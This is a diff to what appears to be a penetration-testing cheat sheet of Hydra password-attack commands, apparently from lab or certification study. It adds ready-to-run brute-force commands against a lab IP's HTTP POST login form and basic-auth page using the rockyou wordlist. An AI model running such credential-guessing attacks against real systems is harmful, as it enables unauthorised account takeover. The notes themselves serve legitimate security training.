@@ -58,6 +58,13 @@ kali@kali:~$ hydra -L <USERNAME_LIST> -p "SuperS3cure1337#" rdp://<TARGET_IP>
 
 # HTTP Dictionary Attack
 kali@kali:~$ hydra -l <USERNAME> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http(s)-{get/post}-form "/index.php:fm_usr=user&fm_pwd=^PASS^: Login failed. Invalid"
+ 
+POST form
+hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.163.201 -s 9443 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"  
+
+Baisc Auth 
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.163.201 -s 8080 http-get /index.php 
+
 # use http-head for basic auth
 # use http-get for digest auth without colon-delimited fields
 # refer to sample response for username and password variable names
